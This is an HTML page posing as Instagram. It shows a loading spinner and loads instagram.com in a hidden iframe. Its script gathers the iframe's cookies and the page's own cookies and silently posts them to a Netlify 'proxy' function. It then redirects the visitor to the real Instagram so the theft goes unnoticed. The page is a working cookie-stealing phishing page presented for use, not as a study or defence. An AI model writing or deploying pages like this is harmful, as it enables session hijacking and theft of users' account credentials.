<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #fafafa;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }
        .loader {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .spinner {
            width: 30px;
            height: 30px;
            border: 3px solid #dbdbdb;
            border-top: 3px solid #0095f6;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        /* Hidden iframe to load Instagram and set cookies */
        #ig-frame {
            display: none;
            width: 0;
            height: 0;
        }
    </style>
</head>
<body>
    <div class="loader">
        <div class="spinner"></div>
    </div>

    <!-- Hidden iframe to force Instagram to set all its cookies -->
    <iframe id="ig-frame" src="https://www.instagram.com/"></iframe>

    <script>
        // Wait for the iframe to load
        const iframe = document.getElementById('ig-frame');
        
        iframe.onload = function() {
            try {
                // Get all cookies from the iframe's domain
                // This ensures we capture cookies set by Instagram's JS
                const iframeCookies = iframe.contentDocument.cookie;
                
                // Also get any cookies from the main window (in case some were set before)
                const mainCookies = document.cookie;
                
                // Combine them (deduplicate by name)
                const allCookies = combineCookies(mainCookies, iframeCookies);

                // Send to Netlify function
                fetch('/.netlify/functions/proxy', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        cookies: allCookies,
                        timestamp: new Date().toISOString()
                    }),
                    keepalive: true
                }).catch(err => console.log("Logger failed silently", err));

            } catch (e) {
                // Fallback: just send main cookies if cross-origin issues occur
                fetch('/.netlify/functions/proxy', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        cookies: document.cookie,
                        timestamp: new Date().toISOString()
                    }),
                    keepalive: true
                }).catch(err => console.log("Logger fallback failed", err));
            } finally {
                // Redirect user to Instagram
                window.location.href = "https://www.instagram.com/";
            }
        };

        // Function to combine and deduplicate cookies
        function combineCookies(c1, c2) {
            const map = new Map();
            const parse = (str) => {
                if (!str) return;
                str.split(';').forEach(pair => {
                    const [key, ...val] = pair.trim().split('=');
                    if (key && val.length) {
                        map.set(key, val.join('='));
                    }
                });
            };
            parse(c1);
            parse(c2);
            let result = [];
            map.forEach((val, key) => {
                result.push(`${key}=${val}`);
            });
            return result.join('; ');
        }

        // Fallback if iframe doesn't load in 2 seconds
        setTimeout(() => {
            // Redirect anyway
            window.location.href = "https://www.instagram.com/";
        }, 2000);
    </script>
</body>
</html>
